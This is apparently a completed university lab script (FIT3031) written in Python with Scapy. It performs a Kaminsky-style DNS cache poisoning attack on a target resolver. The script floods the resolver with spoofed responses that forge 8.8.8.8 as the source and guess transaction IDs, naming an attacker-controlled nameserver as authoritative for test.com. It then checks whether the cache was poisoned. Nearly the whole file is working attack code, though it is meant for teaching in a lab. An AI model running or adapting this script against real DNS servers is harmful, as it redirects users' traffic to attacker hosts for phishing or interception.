#! usr/bin/python3
# FIT3031 Teaching Team


from scapy.all import *
import random
import string

#### ATTACK CONFIGURATION ####
from scapy.layers.dns import *
from scapy.layers.inet import *

ATTEMPT_NUM = 10000  # 尝试次数
dummy_domain_lst = []

# IP of our attacker's machine
attacker_ip = "10.10.10.194"  # TODO:complete attacker's IP

# IP of our victim's dns server
target_dns_ip = "10.10.5.53"  # TODO:complete DNS server's IP

# DNS Forwarder if local couldnt resolve
# or real DNS of the example.com
forwarder_dns = "8.8.8.8"

# target dns port
target_dns_port = 33333

# TODO Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# each dummy host should concat random substrings in dummy_domain_prefix and base_domain
# Your code goes here to generate 10000 dummy hostname


for i in range(0, ATTEMPT_NUM):
    random_domain = ''.join(random.sample(string.ascii_letters, 6)) + '.test.com'  # random: xxxxxx.test.com
    dummy_domain_lst.append(random_domain)

print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0, ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    # TODO Step 2 : Generate a random DNS query for cur_domain to challenge the local DNS
    IPpkt = IP(dst=target_dns_ip, src=attacker_ip)  # Your code goes here ??
    UDPpkt = UDP(dport=53, sport=33333, chksum=0)  # Your code goes here ??
    DNSpkt = DNS(id=0xaaaa, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0,
                 qd=DNSQR(qname=cur_domain))  # Your code goes here ??
    query_pkt = IPpkt / UDPpkt / DNSpkt
    send(query_pkt, verbose=0)

    # TODO Step 3 : For that DNS query, generate 100 random guesses with random transactionID to spoof the response packet

    for i in range(100):
        tran_id = random.randint(0, 65535)

        IPpkt = IP(dst=target_dns_ip, src=forwarder_dns, chksum=0)  # Your code goes here ??
        UDPpkt = UDP(dport=33333, sport=53, chksum=0)  # Your code goes here ??
        Anssec = DNSRR(rrname=cur_domain, type='A', rdata='1.2.3.4', ttl=200000)
        NSsec = DNSRR(rrname='test.com', type='NS', ttl=200000, rdata='ns.attacker.com')
        Addsec = DNSRR(rrname='ns.attacker.com ', type='A', ttl=200000, rdata=attacker_ip)
        DNSpkt = DNS(id=tran_id, aa=1, rd=0, qr=1, ancount=1, nscount=1, arcount=1, an=Anssec, ns=NSsec,
                     ar=Addsec)  # Your code goes here ??

        response_pkt = IPpkt / UDPpkt / DNSpkt
        send(response_pkt, verbose=0)


    ####### Step 4 : Verify the result by sending a DNS query to the server
    # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025, 65000), dport=53)
    DNSpkt = DNS(id=99, rd=1, qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt / UDPpkt / DNSpkt
    z = sr1(query_pkt, timeout=2, retry=0, verbose=0)
    try:
        if (z[DNS].an.rdata == attacker_ip):
            print("Poisonned the victim DNS server successfully.")
            break
    except:
        print("Poisonning failed")

#### END ATTACK SIMULATION
